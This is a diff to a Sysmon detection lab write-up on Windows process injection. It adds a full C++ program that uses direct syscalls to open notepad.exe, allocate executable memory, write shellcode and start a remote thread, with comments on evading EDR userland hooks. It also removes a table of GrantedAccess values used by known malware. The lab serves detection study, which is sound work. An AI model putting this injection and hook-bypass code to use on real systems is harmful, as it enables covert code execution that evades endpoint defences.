@@ -29,18 +29,6 @@ On Windows 11, when injecting into a process owned by the same user in the same 
 | 0x101a   | VM_WRITE+VM_OP+VM_READ+QUERY_LIMITED                | Reflective DLL injection pattern           |
 | 0x147a   | VM_WRITE+VM_OP+CREATE_THREAD+DUP+QUERY+SUSPEND      | Full injection with suspend capability     |
 
-### Real Malware Examples
-| Malware Family    | GrantedAccess | Notes                              |
-|-------------------|---------------|------------------------------------|
-| Cobalt Strike     | 0x1fffff      | Default beacon injection           |
-| Cobalt Strike     | 0x143a        | With minimal rights setting        |
-| Meterpreter       | 0x1fffff      | Default migrate                    |
-| TrickBot          | 0x1410        | Memory write without thread        |
-| Dridex            | 0x0800        | Thread hijack path                 |
-| Emotet            | 0x143a        | Classic injection minimum          |
-| Mimikatz          | 0x1010        | LSASS credential dump              |
-| Mimikatz          | 0x0010        | Minimal LSASS read                 |
-
 
 ## Lab setup
 1. Windows Host running ELK in WSL with local FW rules to push traffic to the host -> WSL
@@ -849,7 +837,7 @@ EID 25 fired with Type: Image is replaced, confirms Sysmon detected the in-memor
 | 2    | NtUnmapViewOfSection removes image      | EID 25     | Process Tampering       |
 | 3    | Shellcode written to remote memory      | -          | -                       |
 | 4    | Thread context redirected to shellcode  | -          | -                       |
-| 5    | Thread resumed                          | —          | —                       |
+| 5    | Thread resumed                          | -          | -                       |
 
 ### Key Indicators
 - **EID 25** `Type: Image is replaced` On-disk PE no longer matches in-memory image.
@@ -862,8 +850,8 @@ Direct syscalls bypasses ntdll.dll entirely by executing the syscall instruction
 | API Call                    | Layer          | Sysmon Event |
 |-----------------------------|----------------|--------------|
 | SysNtOpenProcess()          | Direct Syscall | EID 10       |
-| SysNtAllocateVirtualMemory()| Direct Syscall | —            |
-| SysNtWriteVirtualMemory()   | Direct Syscall | —            |
+| SysNtAllocateVirtualMemory()| Direct Syscall | -            |
+| SysNtWriteVirtualMemory()   | Direct Syscall | -            |
 | SysNtCreateThreadEx()       | Direct Syscall | EID 8        |
 
 | Function                 | SSN    |
@@ -874,6 +862,158 @@ Direct syscalls bypasses ntdll.dll entirely by executing the syscall instruction
 | NtCreateThreadEx         | 0x00C9 |
 | NtProtectVirtualMemory   | 0x0050 |
 
+```
+// t5_direct_syscall.cpp
+#include "common.h"
+
+// NT types needed for syscall signatures
+typedef struct _OBJECT_ATTRIBUTES {
+    ULONG Length;
+    HANDLE RootDirectory;
+    PVOID ObjectName;
+    ULONG Attributes;
+    PVOID SecurityDescriptor;
+    PVOID SecurityQualityOfService;
+} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
+
+typedef struct _CLIENT_ID {
+    HANDLE UniqueProcess;
+    HANDLE UniqueThread;
+} CLIENT_ID, *PCLIENT_ID;
+
+// Syscall stubs declared in syscalls.asm
+extern "C" {
+    NTSTATUS SysNtOpenProcess(
+        PHANDLE ProcessHandle,
+        ACCESS_MASK DesiredAccess,
+        POBJECT_ATTRIBUTES ObjectAttributes,
+        PCLIENT_ID ClientId
+    );
+    NTSTATUS SysNtAllocateVirtualMemory(
+        HANDLE ProcessHandle,
+        PVOID* BaseAddress,
+        ULONG_PTR ZeroBits,
+        PSIZE_T RegionSize,
+        ULONG AllocationType,
+        ULONG Protect
+    );
+    NTSTATUS SysNtWriteVirtualMemory(
+        HANDLE ProcessHandle,
+        PVOID BaseAddress,
+        PVOID Buffer,
+        SIZE_T NumberOfBytesToWrite,
+        PSIZE_T NumberOfBytesWritten
+    );
+    NTSTATUS SysNtCreateThreadEx(
+        PHANDLE ThreadHandle,
+        ACCESS_MASK DesiredAccess,
+        PVOID ObjectAttributes,
+        HANDLE ProcessHandle,
+        PVOID StartRoutine,
+        PVOID Argument,
+        ULONG CreateFlags,
+        SIZE_T ZeroBits,
+        SIZE_T StackSize,
+        SIZE_T MaximumStackSize,
+        PVOID AttributeList
+    );
+}
+
+int main() {
+    DWORD pid = GetPID(L"notepad.exe");
+    if (!pid) {
+        wprintf(L"[-] notepad.exe not found\n");
+        return 1;
+    }
+    wprintf(L"[*] Target PID: %lu\n", pid);
+
+    // Build required structures for NtOpenProcess
+    OBJECT_ATTRIBUTES oa = {};
+    oa.Length = sizeof(OBJECT_ATTRIBUTES);
+
+    CLIENT_ID cid = {};
+    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
+    cid.UniqueThread  = NULL;
+
+    // EID 10 fires here — kernel records handle open
+    // ntdll hook bypassed — Sysmon still catches it
+    HANDLE hProc = NULL;
+    NTSTATUS st = SysNtOpenProcess(
+        &hProc,
+        PROCESS_VM_WRITE         |
+        PROCESS_VM_OPERATION     |
+        PROCESS_CREATE_THREAD    |
+        PROCESS_QUERY_INFORMATION,
+        &oa,
+        &cid
+    );
+    wprintf(L"[+] SysNtOpenProcess: 0x%08X handle: 0x%p\n", st, hProc);
+    if (!hProc) {
+        wprintf(L"[-] Failed to open process\n");
+        return 1;
+    }
+
+    // Allocate RWX memory in remote process
+    PVOID remoteMem = NULL;
+    SIZE_T allocSize = shellcode_size;
+    st = SysNtAllocateVirtualMemory(
+        hProc,
+        &remoteMem,
+        0,
+        &allocSize,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+    );
+    wprintf(L"[+] SysNtAllocateVirtualMemory: 0x%08X at 0x%p\n", st, remoteMem);
+    if (st != 0) {
+        wprintf(L"[-] Allocation failed\n");
+        return 1;
+    }
+
+    // Write shellcode
+    SIZE_T written = 0;
+    st = SysNtWriteVirtualMemory(
+        hProc,
+        remoteMem,
+        shellcode,
+        shellcode_size,
+        &written
+    );
+    wprintf(L"[+] SysNtWriteVirtualMemory: 0x%08X wrote %zu bytes\n", st, written);
+    if (st != 0) {
+        wprintf(L"[-] Write failed\n");
+        return 1;
+    }
+
+    // EID 8 fires here — kernel thread creation event identical to T1/T2
+    // ntdll hook bypassed — Sysmon still catches it
+    HANDLE hThread = NULL;
+    st = SysNtCreateThreadEx(
+        &hThread,
+        GENERIC_EXECUTE,
+        NULL,
+        hProc,
+        remoteMem,
+        NULL,
+        0,
+        0, 0, 0,
+        NULL
+    );
+    wprintf(L"[+] SysNtCreateThreadEx: 0x%08X\n", st);
+    if (!hThread) {
+        wprintf(L"[-] Thread creation failed\n");
+        return 1;
+    }
+    wprintf(L"[+] Remote thread created\n");
+    wprintf(L"[*] ntdll hooks bypassed — Sysmon should still catch EID 8 and 10\n");
+    wprintf(L"[*] Direct syscalls evade EDR userland hooks not kernel monitoring\n");
+
+    WaitForSingleObject(hThread, 5000);
+    CloseHandle(hThread);
+    CloseHandle(hProc);
+    return 0;
+}
+```
 
 
 ### Sysmon Data
